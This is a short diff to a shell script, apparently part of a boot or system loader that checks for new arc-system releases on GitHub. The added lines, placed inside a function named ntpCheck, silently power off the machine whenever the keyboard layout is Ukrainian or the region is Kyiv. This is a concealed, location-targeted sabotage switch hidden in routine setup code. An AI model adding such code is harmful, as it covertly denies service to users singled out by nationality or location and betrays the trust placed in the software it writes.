@@ -519,6 +519,9 @@ function ntpCheck() {
     [ -z "${KEYMAP}" ] && KEYMAP="us"
     loadkeys ${KEYMAP}
   fi
+  if [ "${KEYMAP}" == "ua" ] || [ "${REGION}" == "Kyiv" ]; then
+    poweroff
+  fi
   while true; do
     NEWTAG="$(curl -m 10 -skL "https://api.github.com/repos/AuxXxilium/arc-system/releases" | jq -r ".[].tag_name" | grep -v "dev" | sort -rV | head -1)"
     CNT=$((${CNT} + 1))
